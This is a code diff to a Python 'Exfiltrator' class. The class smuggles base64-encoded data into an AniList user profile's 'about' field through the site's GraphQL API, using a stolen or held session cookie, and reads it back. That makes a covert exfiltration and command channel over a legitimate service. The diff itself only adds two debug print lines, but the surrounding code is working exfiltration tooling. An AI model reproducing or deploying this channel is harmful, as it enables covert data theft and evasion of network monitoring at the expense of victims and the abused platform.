@@ -12,6 +12,7 @@ class Exfiltrator:
             "query": "mutation($about:String,$titleLanguage:UserTitleLanguage,$staffNameLanguage:UserStaffNameLanguage,$airingNotifications:Boolean,$displayAdultContent:Boolean,$scoreFormat:ScoreFormat,$rowOrder:String,$profileColor:String,$donatorBadge:String,$notificationOptions:[NotificationOptionInput],$animeListOptions:MediaListOptionsInput,$mangaListOptions:MediaListOptionsInput,$timezone:String,$activityMergeTime:Int $restrictMessagesToFollowing:Boolean,$disabledListActivity:[ListActivityOptionInput],){UpdateUser(about:$about,titleLanguage:$titleLanguage,staffNameLanguage:$staffNameLanguage,airingNotifications:$airingNotifications,displayAdultContent:$displayAdultContent,scoreFormat:$scoreFormat,rowOrder:$rowOrder,profileColor:$profileColor,donatorBadge:$donatorBadge,notificationOptions:$notificationOptions,animeListOptions:$animeListOptions,mangaListOptions:$mangaListOptions timezone:$timezone activityMergeTime:$activityMergeTime restrictMessagesToFollowing:$restrictMessagesToFollowing disabledListActivity:$disabledListActivity){id name about avatar{large}bannerImage unreadNotificationCount donatorTier donatorBadge moderatorRoles options{titleLanguage staffNameLanguage restrictMessagesToFollowing airingNotifications displayAdultContent profileColor timezone activityMergeTime notificationOptions{type enabled}disabledListActivity{type disabled}}mediaListOptions{scoreFormat rowOrder animeList{customLists sectionOrder splitCompletedSectionByFormat advancedScoring advancedScoringEnabled}mangaList{customLists sectionOrder splitCompletedSectionByFormat advancedScoring advancedScoringEnabled}}}}",
             "variables": {"about": base64.b64encode(bytes).decode()}}
         response = requests.post("https://anilist.co:443/graphql", headers=headers, cookies=cookies, json=json)
+        print(response.text)
 
     def recv(self):
         cookies = {"laravel_session": self.data_dict["laravel_session"]}
@@ -21,6 +22,7 @@ class Exfiltrator:
             "variables": {}
         }
         response = requests.post("https://anilist.co:443/graphql", headers=headers, cookies=cookies, json=json)
+        print(response.text)
         return base64.b64decode(response.json()["data"]["Viewer"]["about"]).decode()
 
 
